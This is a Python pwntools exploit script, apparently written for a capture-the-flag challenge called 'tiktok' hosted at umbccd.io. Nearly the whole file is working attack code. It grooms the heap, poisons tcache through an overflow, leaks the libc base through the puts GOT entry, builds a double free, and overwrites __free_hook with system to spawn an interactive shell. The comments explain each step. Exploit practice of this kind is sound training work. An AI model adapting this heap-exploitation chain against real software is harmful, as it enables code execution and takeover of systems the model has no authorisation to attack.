from pwn import *
context.arch="amd64"

elf = ELF("./tiktok",False)
songs = 0x404060
libc = ELF("./libc-2.27.so",False)

if 'rem' in sys.argv:
    r = remote("umbccd.io", 4800)
else:
    if '-d' in sys.argv:
        os.system("docker exec ub18 pkill -9 gdb")
    os.system("docker exec ub18 pkill -9 tiktok")
    r = remote("0", 1338)
    if '-d' in sys.argv:
        os.system("docker exec ub18 pidof tiktok > /tmp/ddd")
        pid = int(open("/tmp/ddd","r").read().split(' ')[0])
        script = '''
        set follow-fork-mode parent
        set detach-on-fork on

        #b *0x401822
        c
        #c 4
        '''
        open("/tmp/script.gdb","w").write(script)
        os.system("docker cp /tmp/script.gdb ub18:/tmp/script.gdb")
        run_in_new_terminal("docker exec -it ub18 gdb -q /tiktok/tiktok %d -x /tmp/script.gdb"%pid)
        pid = pidof("tiktok").next()
        proc.wait_for_debugger(pid)

def imp(path):
    r.sendafter("Choice: ", "1\n")
    r.sendafter("path.\n", path)
def play(idx):
    r.sendafter("Choice: ", "3\n")
    r.sendafter("Choice: ", "%d\n"%idx)
def heap(idx, pl, sz=None):
    if sz is None:
        sz = len(pl)
    play(idx)
    sz = str(sz)
    if len(sz) > 4:
        raise Exception("too long size")
    if len(sz) < 4:
        sz += "\n"
    r.send(sz)
    r.send(pl)
def rem(idx):
    r.sendafter("Choice: ", "4\n")
    r.sendafter("Choice: ", "%d\n"%idx)
def view():
    r.sendafter("Choice: ", "2\n")

imp("Rainbow/oldflame.txt")
for i in xrange(0x2e-3-1):
    imp("Animal/animal.txt")
imp("Animal".ljust(0x18,"/"))

play(1) # makes 0x450 chunk
play(2) # makes 0x3c0 chunk
# now layout is [0x450][0x3c0]

# maximum tcache size is 0x420, so this becomes an unsorted chunk
rem(1) # unsorted 0x450 chunk
rem(2) # 0x3c0 tcache chunk
# now layout is [0x450 unsorted][0x3c0 tcache]

# malloc(0) will split up 0x450 unsorted chunk
# and give something like [0x20 chunk][0x430 unsorted][0x3c0 tcache]
# so we can overflow the free tcache chunk, and set its next pointer
# within the data section on songs[2].album
# since songs[2].album points into the song_path, we get a fake linked list like this
# [0x3c0 tcache] -> &songs[2].album -> &songs[2].song_path
#           +-------------+
#           | song_path   |<----\
# [heap] -->| album       |-----/
#           +-------------+
heap(44, "A"*0x450+p64(songs+0x38*2+0x20), -1)

# alloc another 0x3c0 chunk
# pops tcache head, making tcache head point to &songs[2].album
play(3)
# alloc another 0x3c0 chunk
# malloc returns &songs[2].album, so songs[19].contents = &songs[2].album
# and tcache head becomes &songs[2].song_path
# then this fake chunk is memsetted
# the file length works out exactly such that songs[19].fd will be zeroed
#  but songs[19].contents will not
# so the read is then read(0, &songs[2].album, 0x3b3)
# so we can create some fake song structs
play(20)

fake_chunk = songs+0x38*4+0x10
# album, song, contents
# use this to leak libc, and set contents to free later, pointing to a fake chunk
pl = flat(elf.got['puts'], 0, fake_chunk)
# path, fd, album, song, contents
# make album a valid address, so we can free the contents
# both this song and previous song have contents pointing to a fake chunk
# so we can remove both songs and get a double free
# note the file descriptor will be closed, so make it an invalid fd
pl += "A"*0x18+flat(0xff, elf.address, 0, fake_chunk)
# this songs path contains the fake chunk size of 0x20
pl += flat(0, 0x21, 0)+flat(0xff, 0, 0, 0)
# now put a few songs that will end up reading from stdin
# this way we can malloc of the size we want, to utilize the double free later
# these are song numbers 6,7,8...
stdin_song = "A"*0x18+flat(0, elf.address, 0, 0)
pl += stdin_song*3
r.send(pl)

view()
r.recvuntil("3. ")
libc.address = u64(r.recvuntil("-(null)", drop=True).ljust(8,'\0'))-libc.symbols['puts']
print "LIBC: "+hex(libc.address)

# double free our fake 0x20 chunk, goes in tcache
rem(3)
rem(4)

# tcache 0x20 is currently looped: [heap]--\
#                                    ^-----/
# make one 0x20 allocation, and set a fake next pointer
heap(6, flat(libc.symbols['__free_hook']))
# now tcache 0x20 is [heap] -> [__free_hook]
# make another 0x20 allocation to consume the first entry
heap(7, "/bin/sh")
# now tcache head is __free_hook
# overwrite it with system
heap(8, flat(libc.symbols['system']))

# trigger system() by freeing a chunk
rem(7)

r.interactive()
os.system("docker exec ub18 pkill -9 tiktok")
